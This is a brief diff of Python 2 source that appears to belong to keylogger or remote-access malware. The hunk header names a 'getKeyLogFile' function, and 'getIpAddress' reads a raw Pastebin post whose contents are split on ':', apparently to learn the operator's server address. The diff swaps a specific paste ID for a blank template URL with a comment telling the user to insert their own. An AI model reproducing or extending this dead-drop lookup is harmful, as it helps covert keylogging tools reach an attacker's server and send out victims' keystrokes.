@@ -214,7 +214,8 @@ def getKeyLogFile(s, path):
 
 def getIpAddress():
     # Create a pastebin post and paste the raw url here
-    response = urllib2.urlopen("""https://pastebin.com/raw/xtMtpGD8""")
+    response = urllib2.urlopen("""https://pastebin.com/raw/""")
+    #=============================================================
     data = response.read()
     response.close()
     info = data.split(':')
